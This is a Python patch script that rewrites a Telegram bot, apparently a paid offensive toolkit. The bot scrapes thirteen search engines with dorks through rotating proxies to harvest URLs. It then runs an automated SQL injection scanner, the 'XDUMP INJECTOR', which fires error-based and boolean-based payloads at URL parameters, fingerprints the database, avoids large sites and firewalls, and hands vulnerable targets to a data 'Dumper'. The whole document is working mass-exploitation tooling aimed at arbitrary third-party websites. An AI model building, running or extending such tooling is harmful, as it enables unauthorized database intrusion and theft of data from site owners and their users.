import sys, py_compile
fn=sys.argv[1] if len(sys.argv)>1 else "new.py"
src=open(fn,"r",encoding="utf-8").read()
if "# MEGA-v1" in src:
    print("ALREADY PATCHED:",fn); sys.exit(0)
def cut(src,a,b,new):
    ia=src.index(a); ib=src.index(b)
    return src[:ia]+new+src[ib:]
# ---- M1a EMO + ALL_ENGINES ----
src=cut(src,'EMO={','LANG_TXT','''EMO={"ddg":"🦆","bing":"🅱️","yahoo":"🟡","brave":"🦁","mojeek":"🟢","google":"🇬","ecosia":"🌳","ask":"❓","yep":"✅","yandex":"🔴","aol":"🟣","seekx":"🔎","mws":"🌀"}
ALL_ENGINES=["ddg","bing","yahoo","brave","mojeek","ecosia","ask","yep","google","yandex","aol","seekx","mws"]
# MEGA-v1
''')
# ---- M1b ENG_SEL ----
src=cut(src,'ENG_SEL={','''
def clean_href''','''ENG_SEL={"ddg":(".result__a",["duckduckgo"]),"bing":("li.b_algo h2 a",["bing.com"]),"yahoo":("h3 a",["yahoo.","search.yahoo"]),"brave":("div.result a",["brave.com"]),"mojeek":("h2 a",["mojeek"]),"google":("div.g a",["google.","webcache","youtube."]),"ecosia":("article.result a, .result a",["ecosia.org"]),"ask":("a[class*='title'], .search-result a",["ask.com"]),"yep":("div[aria-label] a, a.result-link",["yep.com"]),"yandex":("li.serp-item a, a.organic__url",["yandex."]),"aol":("h3 a, a.title",["aol.","search.aol"]),"seekx":("a[href]",["seekx.io"]),"mws":("a[href]",["mywebsearch"])}
def clean_href''')
# ---- M2 a_eng ----
src=cut(src,'async def a_eng(','def score_url(',r'''async def a_eng(s,dork,eng,pg,fresh,proxy):
    hd={**HDR,"User-Agent":random.choice(UA_POOL)}
    fr={"d":"&filters=ex1%3A%22ez1%22","w":"&filters=ex1%3A%22ez2%22"}.get(fresh,"")
    if eng=="ddg": url=f"https://html.duckduckgo.com/html/?q={quote_plus(dork)}"
    elif eng=="bing": url=f"https://www.bing.com/search?q={quote_plus(dork)}&count=50&first={1+pg*50}"+fr
    elif eng=="yahoo": url=f"https://search.yahoo.com/search?p={quote_plus(dork)}&b={1+pg*10}"
    elif eng=="brave": url=f"https://search.brave.com/search?q={quote_plus(dork)}&offset={pg}"+({"d":"&tf=pd","w":"&tf=pw"}.get(fresh,""))
    elif eng=="mojeek": url=f"https://www.mojeek.com/search?q={quote_plus(dork)}&start={pg*10}"
    elif eng=="ecosia": url=f"https://www.ecosia.org/search?q={quote_plus(dork)}"
    elif eng=="ask": url=f"https://www.ask.com/web?q={quote_plus(dork)}"
    elif eng=="yep": url=f"https://yep.com/web?q={quote_plus(dork)}"
    elif eng=="yandex": url=f"https://yandex.com/search/?text={quote_plus(dork)}&p={pg}"
    elif eng=="aol": url=f"https://search.aol.com/aol/search?q={quote_plus(dork)}&page={pg+1}"
    elif eng=="seekx": url=f"https://seekx.io/search?q={quote_plus(dork)}"
    elif eng=="mws": url=f"https://search.mywebsearch.com/mywebsearch/search.jhtml?searchfor={quote_plus(dork)}"
    else: url=f"https://www.google.com/search?q={quote_plus(dork)}&num=50&start={pg*50}"+({"d":"&tbs=qdr:d","w":"&tbs=qdr:w"}.get(fresh,""))
    t,st=await a_get_fb(s,url,proxy,headers=hd)
    if st in (403,429,503): t,st=await a_get_fb(s,url,proxy,headers={**HDR,"User-Agent":random.choice(UA_POOL)})
    out=[]
    if t and st==200:
        soup=BeautifulSoup(t,"html.parser"); sel=ENG_SEL[eng]
        for a in soup.select(sel[0]):
            h=clean_href(a.get("href",""),sel[1])
            if h: out.append(h)
        if not out:
            for a in soup.select("a[href]"):
                h=clean_href(a.get("href",""),sel[1])
                if h: out.append(h)
        if eng=="ddg" and not out:
            t2,_=await a_get(s,f"https://lite.duckduckgo.com/lite/?q={quote_plus(dork)}",proxy,headers=hd)
            if t2:
                for a in BeautifulSoup(t2,"html.parser").select("a"):
                    h=clean_href(a.get("href",""),["duckduckgo"])
                    if h: out.append(h)
    if out: return out,200
    if not t: return None,st
    return out,st
''')
# ---- M3 LANGS + make_keywords ----
src=cut(src,'def make_keywords(','''# ============ CAPTCHA SOLVER''',r'''LANG_MODS={"en":["buy","cheap","best","top","review","discount","online","price","shop","sale"],"hi":["खरीदें","सस्ता","best","कीमत","ऑनलाइन","दाम","रीव्यू","खरीद"],"zh":["购买","便宜","最好","价格","在线","评论","促销","商城"],"es":["comprar","barato","mejor","precio","online","oferta","reseñas","tienda"],"ar":["شراء","رخيص","أفضل","سعر","اونلاين","خصم","مراجعة","متجر"],"fr":["acheter","pas cher","meilleur","prix","en ligne","promo","avis","boutique"],"pt":["comprar","barato","melhor","preço","online","oferta","avaliações","loja"],"ru":["купить","дешево","лучший","цена","онлайн","скидка","отзывы","магазин"],"id":["beli","murah","terbaik","harga","online","diskon","ulasan","toko"],"de":["kaufen","billig","beste","preis","online","rabatt","bewertung","shop"],"ja":["購入","安い","最高","価格","オンライン","割引","レビュー","ショップ"],"tr":["satın al","ucuz","en iyi","fiyat","online","indirim","yorum","mağaza"],"ko":["구매","저렴","최고","가격","온라인","할인","리뷰","쇼핑"],"it":["compra","economico","migliore","prezzo","online","sconto","recensioni","negozio"],"nl":["kopen","goedkoop","beste","prijs","online","korting","winkel","review"],"pl":["kup","tani","najlepszy","cena","online","promocja","opinie","sklep"],"vi":["mua","rẻ","tốt nhất","giá","online","giảm giá","đánh giá","cửa hàng"],"th":["ซื้อ","ถูก","ดีที่สุด","ราคา","ออนไลน์","ส่วนลด","รีวิว","ร้าน"],"bn":["কিনুন","সস্তা","সেরা","দাম","অনলাইন","ছাড়","রিভিউ","দোকান"],"fa":["خرید","ارزان","بهترین","قیمت","آنلاین","تخفیف","بررسی","فروشگاه"]}
def km_lang_mk(data):
    mk=types.InlineKeyboardMarkup()
    codes=list(LANG_MODS.keys())
    for i in range(0,len(codes),5):
        mk.row(*[btn(("✅" if c in data["langs"] else "")+c.upper(),"lang:"+c) for c in codes[i:i+5]])
    mk.row(btn("🌍 All","lang:all"),btn("✅ Done","lang:done"))
    back_row(mk)
    return mk
def make_keywords(kws,count,langs=("en",)):
    out=set(); guard=0
    while len(out)<count and guard<count*80:
        guard+=1
        lg=random.choice(list(langs)); mods=LANG_MODS.get(lg,LANG_MODS["en"])
        kw=random.choice(kws).strip()
        if not kw: continue
        m=random.choice(mods); p=random.choice(KM_PLATS); y=random.choice(KM_YEARS)
        kw2=random.choice(kws).strip()
        st=random.randint(0,8)
        c=[kw+" "+m,m+" "+kw,kw+" "+p,kw+" "+y,kw+" "+m+" "+y,kw+" "+p+" "+y,m+" "+kw+" "+p,(kw+" "+kw2) if kw2!=kw else (kw+" "+m+" "+p),m+" "+kw+" "+y][st]
        c=re.sub(r"\s+"," ",c).strip().lower()
        if 4<len(c)<60: out.add(c)
    return list(out)
# ============ CAPTCHA SOLVER''')
# ---- M4 _cb km region ----
src=cut(src,'elif d=="menu:km":','elif d=="menu:gen":',r'''elif d=="km:gap":
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="km_kw":
            st[1]["gap"]=not st[1].get("gap",False)
            bot.send_message(cid,"🧹 Gap-Remove: "+("ON" if st[1]["gap"] else "OFF"))
        return
    elif d.startswith("lang:"):
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="km_lang":
            if d=="lang:all": st[1]["langs"]=list(LANG_MODS.keys())
            elif d=="lang:done":
                if not st[1]["langs"]: st[1]["langs"]=["en"]
                with STATES_LOCK: states[uid]=("km_count",{"kws":st[1]["kws"],"langs":st[1]["langs"]})
                set_cur(uid,"km_count")
                mk=types.InlineKeyboardMarkup()
                mk.row(btn("🧠 100","kmc:100"),btn("🧠 500","kmc:500"),btn("🧠 1k","kmc:1000"))
                mk.row(btn("🧠 5k","kmc:5000"),btn("🧠 10k","kmc:10000"),btn("✏️ Custom","kmc:custom"))
                back_row(mk)
                bot.send_message(cid,f"🌍 {len(st[1]['langs'])} languages selected.\nKitne keywords? (1-10000):",reply_markup=mk)
                return
            else:
                c=d[5:]
                if c in st[1]["langs"]: st[1]["langs"].remove(c)
                else: st[1]["langs"].append(c)
            try: bot.edit_message_text(f"🌍 LANGUAGES ({len(st[1]['langs'])} selected)\nTap = toggle:",chat_id=cid,message_id=mid,reply_markup=km_lang_mk(st[1]))
            except: pass
        return
    elif d=="menu:km":
        if not lic_gate(cid,uid): return
        set_cur(uid,"km")
        with STATES_LOCK: states[uid]=("km_kw",{"gap":False})
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("🧹 Gap-Remove OFF","km:gap"))
        back_row(mk)
        send_banner(cid,"keywords",f"🧠 KEYWORD MAKER\n{LINE}\nKeywords bhejo (text/.txt):",mk)
    elif d.startswith("kmc:"):
        with STATES_LOCK: st=states.get(uid)
        if st and st[0]=="km_count":
            kws=st[1]["kws"]; langs=st[1].get("langs",["en"])
            if d=="kmc:custom":
                with STATES_LOCK: states[uid]=("km_amount",{"kws":kws,"langs":langs})
                bot.send_message(cid,"✏️ Kitne? (1-10000):"); return
            with STATES_LOCK: states.pop(uid,None)
            threading.Thread(target=run_km,args=(cid,uid,kws,int(d[4:]),langs)).start()
''')
# ---- M5 _m_input km region ----
src=cut(src,'elif name=="km_kw":','elif name=="gen_kw":',r'''elif name=="km_kw":
        kws=lines_of(text)
        if data.get("gap"):
            seen=set(); cl=[]
            for k in kws:
                k=re.sub(r"\s+"," ",k).strip()
                if len(k)>1 and k.lower() not in seen: seen.add(k.lower()); cl.append(k)
            kws=cl
        if not kws: bot.send_message(m.chat.id,"❌!"); return
        with STATES_LOCK: states[uid]=("km_lang",{"kws":kws,"langs":[]})
        set_cur(uid,"km_lang")
        bot.send_message(m.chat.id,f"🧠 {len(kws)} keywords mile.\n🌍 Languages select karo:",reply_markup=km_lang_mk({"langs":[]}))
    elif name=="km_count":
        try:
            n=int(text.replace(",","").strip())
            if not (1<=n<=10000): bot.send_message(m.chat.id,"❌ 1-10000!"); return
            with STATES_LOCK: kws=states.pop(uid)[1]
            threading.Thread(target=run_km,args=(m.chat.id,uid,kws["kws"],n,kws.get("langs",["en"]))).start()
        except: bot.send_message(m.chat.id,"❌!")
    elif name=="km_amount":
        try:
            n=int(text.replace(",","").strip())
            if not (1<=n<=10000): bot.send_message(m.chat.id,"❌ 1-10000!"); return
            with STATES_LOCK: kws=states.pop(uid)[1]
            threading.Thread(target=run_km,args=(m.chat.id,uid,kws["kws"],n,kws.get("langs",["en"]))).start()
        except: bot.send_message(m.chat.id,"❌!")
''')
# ---- M6 peng ----
src=cut(src,'elif d.startswith("peng:")','elif d=="menu:inject":',r'''elif d.startswith("peng:"):
        with STATES_LOCK: st=states.pop(uid,None)
        if not st or st[0]!="parse_engine": return
        eng=d[5:]; fresh=st[1].get("fresh",""); threads=st[1].get("threads",15)
        pages=st[1].get("pages",1); workers=st[1].get("workers",40)
        engines=ALL_ENGINES if eng=="all" else [eng]
        jid=new_job(); mode=get_mode(uid)
        msg=bot.send_message(cid,"⏳ STARTING...",reply_markup=stop_markup(jid))
        threading.Thread(target=turbo_parse,args=(cid,uid,msg.message_id,jid,st[1]["dorks"],engines,fresh,mode,threads,pages,workers)).start()
''')
# ---- M7 parse_threads chain ----
src=cut(src,'elif name=="parse_threads":','elif name=="dump_urls":',r'''elif name=="parse_threads":
        try: th=int(text.strip())
        except: th=0
        if not (1<=th<=30):
            bot.send_message(m.chat.id,"❌ 1 to 30 only!"); return
        with STATES_LOCK:
            data["threads"]=th; states[uid]=("parse_pages",data)
        set_cur(uid,"parse_pages")
        bot.send_message(m.chat.id,"📄 Pages (1-5):",reply_markup=back_row(types.InlineKeyboardMarkup()))
    elif name=="parse_pages":
        try: pg=int(text.strip())
        except: pg=0
        if not (1<=pg<=5):
            bot.send_message(m.chat.id,"❌ 1-5!"); return
        with STATES_LOCK:
            data["pages"]=pg; states[uid]=("parse_workers",data)
        set_cur(uid,"parse_workers")
        bot.send_message(m.chat.id,"👷 Workers (1-100):",reply_markup=back_row(types.InlineKeyboardMarkup()))
    elif name=="parse_workers":
        try: wk=int(text.strip())
        except: wk=0
        if not (1<=wk<=100):
            bot.send_message(m.chat.id,"❌ 1-100!"); return
        with STATES_LOCK:
            data["workers"]=wk; states[uid]=("parse_engine",data)
        set_cur(uid,"parse_eng")
        mk=types.InlineKeyboardMarkup()
        mk.row(sbtn("🌐 All Engines","peng:all","success"))
        mk.row(btn(f"{EMO['ddg']} DDG","peng:ddg"),btn(f"{EMO['bing']} Bing","peng:bing"))
        mk.row(btn(f"{EMO['yahoo']} Yahoo","peng:yahoo"),btn(f"{EMO['brave']} Brave","peng:brave"))
        mk.row(btn(f"{EMO['mojeek']} Mojeek","peng:mojeek"),btn(f"{EMO['ecosia']} Ecosia","peng:ecosia"))
        mk.row(btn(f"{EMO['ask']} Ask","peng:ask"),btn(f"{EMO['yep']} Yep","peng:yep"))
        mk.row(btn(f"{EMO['google']} Google","peng:google"),btn(f"{EMO['yandex']} Yandex","peng:yandex"))
        mk.row(btn(f"{EMO['aol']} AOL","peng:aol"),btn(f"{EMO['seekx']} SeekX","peng:seekx"))
        mk.row(btn(f"{EMO['mws']} MyWebSearch","peng:mws"))
        mk.row(btn("🕐 24h","fresh:d"),btn("📆 Week","fresh:w"),btn("🌐 All","fresh:"))
        back_row(mk)
        bot.send_message(m.chat.id,f"🔗 {len(data['dorks'])} dorks | 🧵 {data['threads']} | 📄 {data['pages']} | 👷 {data['workers']}\n1) Fresh  2) Engine:",reply_markup=mk)
''')
# ---- M8 turbo_parse ----
src=cut(src,'def turbo_parse(','ERROR_SIGS=[',r'''def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15,pages=1,workers=40):
    # MEGA-v1
    try:
        proxies=hprox(uid); results=[]; seen=set(); done=[0]; estat={}; blocked=set(); reqs=[0]; t0=time.time(); cooldowns={}
        bump("parse"); bumpU(uid,"parse")
        if len(proxies)<sget("hunt_below",10):
            threading.Thread(target=turbo_hunt,args=(0,uid,0,0,150),kwargs={"silent":True},daemon=True).start()
        w=ew_get(); engines=sorted(engines,key=lambda e:-w.get(e,0))[:4]
        pgs=max(1,min(5,int(pages))); wks=max(10,min(150,int(workers)))
        cs=max(1,int(sget("admin_chunk_size",5000)))
        chunks=[dorks[i:i+cs] for i in range(0,len(dorks),cs)]; tc=len(chunks)
        async def run():
            conn=aiohttp.TCPConnector(limit=wks+10,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=5)) as s:
                sem=asyncio.Semaphore(threads); act=list(proxies); rc=[0]; alive=[True]
                async def pcheck():
                    if not act: return
                    sc=asyncio.Semaphore(50)
                    async def chk(p):
                        async with sc:
                            for ep in CHECK_EPS[:2]:
                                try:
                                    async with s.get(ep,proxy=p,ssl=False,timeout=aiohttp.ClientTimeout(total=4)) as r:
                                        if r.status==200 and re.search(r"\d{1,3}(\.\d{1,3}){3}",await r.text()): return p
                                except: continue
                            return None
                    al=[x for x in await asyncio.gather(*[chk(p) for p in act]) if x]
                    if al: act[:]=al
                async def editor():
                    last=[0.0]
                    while alive[0]:
                        await asyncio.sleep(2)
                        now=time.time()
                        if now-last[0]<2: continue
                        last[0]=now
                        et=" ".join(f"{EMO.get(k,'•')}{v}" for k,v in sorted(estat.items(),key=lambda x:-x[1]) if v)
                        rps=round(reqs[0]/max(1,now-t0),1)
                        blk=", ".join(sorted(blocked)) if blocked else "—"
                        try: bot.edit_message_text(f"🌐 SHADOW PARSER ⚡\n{LINE}\n🛡️ {len(act)} | ⚡ {rps} r/s | 🧵 {threads} | 👷 {wks} | 📄 {pgs}\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}% ({done[0]}/{len(dorks)})\n🔗 URLs: {len(results)} | ⛔ {blk}\n🏆 {et}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                        except: pass
                async def task(d):
                    if stopped(jid): return []
                    rc[0]+=1; reqs[0]+=1
                    if rc[0]%30==0: await pcheck()
                    px=random.choice(act) if act else None
                    got=[]
                    async with sem:
                        for eng in engines:
                            if eng in blocked: continue
                            if cooldowns.get(eng,0)>time.time(): continue
                            for pg in range(pgs):
                                r,st=await a_eng(s,d,eng,pg,fresh,px)
                                if r is None:
                                    if st in (403,429,503): cooldowns[eng]=time.time()+20
                                    continue
                                estat[eng]=estat.get(eng,0)+len(r)
                                for u in r:
                                    if u not in seen: seen.add(u); got.append(u)
                                break
                            if got: break
                    return got
                ed=asyncio.ensure_future(editor())
                for ci,chunk in enumerate(chunks):
                    if stopped(jid): break
                    for fut in asyncio.as_completed([task(d) for d in chunk]):
                        if stopped(jid): break
                        results.extend(await fut)
                        done[0]+=1
                alive[0]=False
                try: ed.cancel()
                except: pass
        cf=asyncio.run_coroutine_threadsafe(run(),LOOP)
        while not cf.done():
            if stopped(jid):
                try: cf.result(timeout=10)
                except Exception:
                    try: cf.cancel()
                    except: pass
                break
            time.sleep(0.5)
        w2=ew_get()
        for k,v in estat.items():
            if v: w2[k]=w2.get(k,0)+1
        save_json(EW_FILE,w2)
        urls=uhq_filter(scope_filter(dns_filter(results)))
        clear_markup(cid,mid)
        blk=", ".join(sorted(blocked)) if blocked else "none"
        if urls:
            LAST.setdefault(uid,{})["parsed"]=urls
            tag="urls_partial.txt" if stopped(jid) else "urls.txt"
            send_doc(cid,("\n".join(urls)+"\n").encode(),tag,uid)
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("💉 ➡️ Injector","pipe:inject","success"))
            bot.send_message(cid,f"🌐 PARSER DONE {'⏹️ PARTIAL' if stopped(jid) else '🎉'}\n{LINE}\n🔗 {len(urls)} UHQ URLs!\n⛔ Blocked: {blk}",reply_markup=mk)
        else: bot.send_message(cid,f"😭 Koi URL nahi mila.\n⛔ Blocked: {blk}")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 PARSE BUG:\n{type(e).__name__}: {e}")
        except: pass
''')
# ---- M9 injector region with DB breakdown ----
src=cut(src,'ERROR_SIGS=[','def turbo_hunt(',r'''ERROR_SIGS=["you have an error in your sql","right syntax to use","check the manual that corresponds","mysql_fetch_array","mysql_fetch_assoc","mysql_num_rows","mysqli_num_rows","warning: mysql_","warning: mysqli_","mariadb server","pg_query(","pg_exec(","postgresql query failed","sqlite3::query","sqlite_query(","ora-0","oracle error","pl/sql:","odbc sql server driver","microsoft jet database","jet database engine","unclosed quotation mark","unterminated string literal","quoted string not properly terminated","invalid input syntax for type","syntax error at or near","microsoft vb","vbscript runtime error","conversion failed when converting","supplied argument is not a valid","fatal error: uncaught pdoexception","db2 sql error","informix","division by zero"]
WAF_SIGS=["cloudflare","cf-ray","sucuri","wordfence","akamai","incapsula","imperva","attention required","access denied","blocked by","captcha verify","request unsuccessful"]
BIGDOM=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
SCAN_V=3
def dbfam(sig,pay=""):
    if "CONVERT" in pay: return "MSSQL"
    if "CAST" in pay: return "PostgreSQL"
    s=sig.lower()
    if "postgres" in s or "pg_" in s or "invalid input syntax" in s: return "PostgreSQL"
    if "ora" in s or "pl/sql" in s: return "Oracle"
    if "odbc" in s or "nvarchar" in s or "varchar value" in s or "microsoft" in s or "jet" in s or "db2" in s: return "MSSQL/Access"
    if "sqlite" in s: return "SQLite"
    if "mariadb" in s: return "MariaDB"
    return "MySQL"
def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
ERR_PAY=["'","\"","')","'-- ","\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]
async def a_scan(s,url,to):
    try:
        net=urlparse(url).netloc.lower()
        if any(b in net for b in BIGDOM): return None
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        params=list(query.keys())[:2]; base_c=None
        for pi,param in enumerate(params):
            orig=(query[param] or [""])[0]
            for val in ERR_PAY:
                nq=query.copy(); nq[param]=[orig+val]
                t,_=await a_get_fb(s,build_url(parsed,nq),to=to)
                if not t: continue
                low=t.lower()
                m=re.search(r"~([a-z0-9._\- ]{3,60})~",low)
                if m and re.search(r"\d",m.group(1)): return {"url":url,"param":param,"payload":val,"sig":"error-echo:"+m.group(1),"conf":3,"db":dbfam("",val)}
                hit=None
                for sig in ERROR_SIGS:
                    if sig in low: hit=sig; break
                if hit:
                    if base_c is None:
                        bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
                    if hit not in base_c: return {"url":url,"param":param,"payload":val,"sig":hit,"conf":3,"db":dbfam(hit,val)}
            if pi==0 and orig:
                bt,_=await a_get_fb(s,url,to=to)
                if bt:
                    l0=len(bt)
                    nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                    nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    if t1 and t2 and t3:
                        l1,l2,l3=len(t1),len(t2),len(t3)
                        if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
                            return {"url":url,"param":param,"payload":"boolean-based","sig":"boolean-stable","conf":2,"db":"blind"}
        return None
    except: return None
def turbo_inject(cid,uid,mid,jid,urls,mode,threads=15):
    try:
        vuln=[]; nonev=[]; done=[0]; last=[0.0]; details=[]; reqs=[0]; wafed=[0]; dbst={}; t0=time.time(); since_save=[0]
        bump("inject"); bumpU(uid,"inject")
        vc=load_json(VULN_CACHE,{}); now=time.time(); to_test=[]
        to=min(max(mode["timeout"],6),10)
        for u in urls:
            e=vc.get(u)
            if e and e.get("sv")==SCAN_V and now-e.get("t",0)<7*86400:
                if e.get("v"): vuln.append({"url":u})
                else: nonev.append(u)
                done[0]+=1
            else: to_test.append(u)
        try: bot.edit_message_text(f"💉 XDUMP INJECTOR\n{LINE}\n🧊 {len(to_test)} fresh | 🧵 {threads} | ⏱️ {to}s\n🗄️ MySQL•MariaDB•PG•MSSQL•Oracle•SQLite",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
        except: pass
        HSEM={}
        async def run():
            conn=aiohttp.TCPConnector(limit=threads+10,limit_per_host=20,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=to)) as s:
                sem=asyncio.Semaphore(threads)
                def hsem(h):
                    if h not in HSEM: HSEM[h]=asyncio.Semaphore(2)
                    return HSEM[h]
                async def task(u):
                    async with sem:
                        reqs[0]+=1
                        async with hsem(urlparse(u).netloc):
                            return await a_scan(s,u,to)
                for i in range(0,len(to_test),INJ_BATCH):
                    if stopped(jid): break
                    batch=to_test[i:i+INJ_BATCH]
                    res=await asyncio.gather(*[task(u) for u in batch],return_exceptions=True)
                    for u,r in zip(batch,res):
                        if isinstance(r,dict) and r.get("waf"):
                            wafed[0]+=1; nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                        elif isinstance(r,dict) and r:
                            vuln.append(r); details.append(r); vc[u]={"v":1,"t":now,"sv":SCAN_V}
                            dbst[r.get("db","?")]=dbst.get(r.get("db","?"),0)+1
                        else: nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                    done[0]+=len(batch); since_save[0]+=len(batch)
                    if since_save[0]>=2000: save_json(VULN_CACHE,vc); since_save[0]=0
                    now2=time.time()
                    if now2-last[0]>2:
                        last[0]=now2
                        rps=round(reqs[0]/max(1,now2-t0),1)
                        dbs=" ".join(f"{k}:{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
                        try: bot.edit_message_text(f"💉 XDUMP INJECTOR 💪\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}% ({done[0]}/{len(urls)})\n🩸 Vuln: {len(vuln)} | 🛡️ Safe: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🗄️ {dbs or '—'}\n⚡ {rps} r/s | 🧵 {threads} | 🧊 batch {i//INJ_BATCH+1}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                        except: pass
        _run_on_loop(run())
        if len(vc)>20000: vc=dict(sorted(vc.items(),key=lambda kv:-kv[1].get("t",0))[:10000])
        save_json(VULN_CACHE,vc); clear_markup(cid,mid)
        vurls=[v["url"] for v in vuln]
        if vurls: send_doc(cid,("\n".join(vurls)+"\n").encode(),"vulnerable_urls.txt",uid)
        if nonev: send_doc(cid,("\n".join(nonev)+"\n").encode(),"none_vulnerable_urls.txt",uid)
        if details:
            det="\n".join(f"URL: {d['url']}\nParam: {d['param']} | DB: {d.get('db','?')}\nPayload: {d['payload']}\nSig: {d['sig']} | Conf: {d.get('conf',2)}\n{'-'*40}" for d in details)
            send_doc(cid,(det+"\n").encode(),"vuln_details.txt",uid)
            send_doc(cid,html_report("Vulnerability Report",details).encode(),"report.html",uid)
        if vurls:
            LAST.setdefault(uid,{})["vuln"]=vurls
            dbs=" | ".join(f"{k}×{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("🩸 ➡️ Dumper","pipe:data","danger"))
            bot.send_message(cid,f"💉 INJECTOR DONE {'⏹️ PARTIAL' if stopped(jid) else '🎉'}\n{LINE}\n🩸 {len(vuln)} | 🛡️ {len(nonev)} | 🧱 {wafed[0]}\n🗄️ {dbs or '—'}",reply_markup=mk)
        else: bot.send_message(cid,f"💉 INJECTOR DONE\n{LINE}\n🩸 0 | 🛡️ {len(nonev)} | 🧱 {wafed[0]}\n{done[0]}/{len(urls)} tested")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 INJECT BUG:\n{type(e).__name__}: {e}")
        except: pass
''')
# ---- M10 run_km ----
src=cut(src,'def run_km(','def run_gen(',r'''def run_km(cid,uid,kws,count,langs=("en",)):
    bump("km"); bumpU(uid,"km")
    msg=bot.send_message(cid,f"🧠 KEYWORD MAKER\n{LINE}\n⏳ {count} UHQ | 🌍 {len(langs)} langs...")
    kws=make_keywords(kws,count,langs)
    try: bot.delete_message(cid,msg.message_id)
    except: pass
    send_doc(cid,("\n".join(kws)).encode(),"keywords.txt",uid)
    bot.send_message(cid,f"🧠 DONE\n{LINE}\n🎉 {len(kws)} UHQ keywords | 🌍 {len(langs)} languages!")
''')
open(fn,"w",encoding="utf-8").write(src)
try:
    py_compile.compile(fn,doraise=True)
    print("MEGA PATCHED + SYNTAX OK:",fn)
except Exception as e:
    print("SYNTAX PROBLEM:",e)
